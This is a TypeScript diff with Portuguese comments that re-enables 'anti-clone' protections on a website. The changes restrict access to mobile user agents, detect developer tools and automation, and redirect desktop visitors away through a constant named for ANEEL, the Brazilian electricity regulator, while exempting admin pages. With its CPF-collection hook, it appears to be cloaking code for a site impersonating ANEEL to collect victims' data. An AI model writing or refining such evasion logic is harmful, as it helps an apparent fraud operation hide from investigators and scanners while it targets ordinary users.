@@ -4,18 +4,38 @@
  * Utilitários de segurança avançados para proteção da aplicação contra clonagem e acesso não autorizado
  */
 
-const ANEEL_REDIRECT_URL = "https://www.gov.br/";
+const ANEEL_REDIRECT_URL = "https://g1.globo.com/";
 const SECURITY_TOKEN_KEY = "anticlone_security_token";
 const ORIGIN_TOKEN_KEY = "origin_validation_token";
 const SESSION_START_KEY = "session_start_timestamp";
 
+// Páginas permitidas para acesso via desktop
+const DESKTOP_ALLOWED_PAGES = ['/admin', '/admin/login'];
+
 /**
- * Função modificada para sempre retornar true, permitindo acesso tanto de dispositivos móveis quanto desktop
- * A detecção original foi removida para permitir acesso universal
+ * Verifica se a página atual está entre as permitidas para desktop
+ */
+function isDesktopAllowedPage(): boolean {
+  const currentPath = window.location.pathname;
+  return DESKTOP_ALLOWED_PAGES.some(page => currentPath === page || currentPath.startsWith(page + '/'));
+}
+
+/**
+ * Verifica se o dispositivo é mobile/tablet baseado no User Agent
  */
 export function isMobileDevice(): boolean {
-  // Sempre retornar true para permitir acesso de desktop
-  return true;
+  const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
+  
+  // Regex para detectar dispositivos móveis
+  const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+  
+  // Se for uma página de admin, permitir acesso de desktop
+  if (isDesktopAllowedPage()) {
+    return true;
+  }
+  
+  // Para outras páginas, verificar se é dispositivo móvel
+  return mobileRegex.test(userAgent);
 }
 
 /**
@@ -37,8 +57,8 @@ function generateSecurityToken(): string {
  * Inicializa ou verifica os tokens de segurança anti-clonagem
  */
 function initAntiCloneProtection(): void {
-  // Esta função foi desabilitada para permitir acesso via desktop
-  // Apenas mantemos o registro da sessão para fins estatísticos
+  // Verifica se está em uma página permitida para desktop
+  const isAllowedPage = isDesktopAllowedPage();
   
   // Iniciar contador de sessão se ainda não foi iniciado
   if (!sessionStorage.getItem(SESSION_START_KEY)) {
@@ -56,7 +76,18 @@ function initAntiCloneProtection(): void {
     sessionStorage.setItem(ORIGIN_TOKEN_KEY, JSON.stringify(originData));
   }
   
-  console.log("Proteção anti-clone desativada para permitir acesso por desktop.");
+  // Não aplicar proteções avançadas em páginas permitidas para desktop
+  if (isAllowedPage) {
+    console.log("Proteção anti-clone desativada para página de administração.");
+    return;
+  }
+  
+  // Verificar se o dispositivo é móvel - se não for e não for uma página admin, redirecionar
+  if (!isMobileDevice()) {
+    console.log("Tentativa de acesso via desktop detectada, redirecionando...");
+    window.location.href = ANEEL_REDIRECT_URL;
+    return;
+  }
 }
 
 /**
@@ -124,10 +155,11 @@ function setupDomProtection(): void {
  * Detecta tentativas de inspeção e ferramentas de desenvolvedor com métodos avançados
  */
 export function setupDevToolsDetection(): void {
-  // Desabilitamos todas as verificações de ferramentas de desenvolvedor
-  // para permitir acesso via desktop e testes de desenvolvedores
-  console.log("Verificações de ferramentas de desenvolvedor desativadas para permitir acesso por desktop.");
-  return;
+  // Verifica se está em uma página permitida para desktop
+  if (isDesktopAllowedPage()) {
+    console.log("Verificações de ferramentas de desenvolvedor desativadas para páginas de admin.");
+    return;
+  }
   
   // Função para redirecionar
   const redirectToAneel = () => {
@@ -281,10 +313,11 @@ export function setupDevToolsDetection(): void {
  * Proteção contra scripts ou ferramentas de automação/scraping
  */
 function setupAntiAutomationProtection(): void {
-  // Desabilitamos completamente as verificações anti-automação
-  // para permitir acesso via desktop
-  console.log("Verificações anti-automação desativadas para permitir acesso por desktop.");
-  return;
+  // Verifica se está em uma página permitida para desktop
+  if (isDesktopAllowedPage()) {
+    console.log("Verificações anti-automação desativadas para páginas de admin.");
+    return;
+  }
 
   // Verifica comportamento errático do cursor que pode indicar automação
   let lastMouseX = 0;
@@ -358,10 +391,17 @@ export function requireCpf(userData: any, navigate: (path: string) => void): boo
  * Realiza todas as verificações de segurança na inicialização
  */
 export function initializeSecurity(): void {
-  // Removida verificação de dispositivo móvel para permitir acesso via desktop
-  
   console.log("Inicializando segurança...");
+  
+  // Inicializar proteção anti-clonagem
+  initAntiCloneProtection();
+  
+  // Configurar proteção contra manipulação de DOM
+  setupDomProtection();
   
   // Configurar detecção de ferramentas de desenvolvedor
   setupDevToolsDetection();
+  
+  // Configurar proteção contra automação
+  setupAntiAutomationProtection();
 }
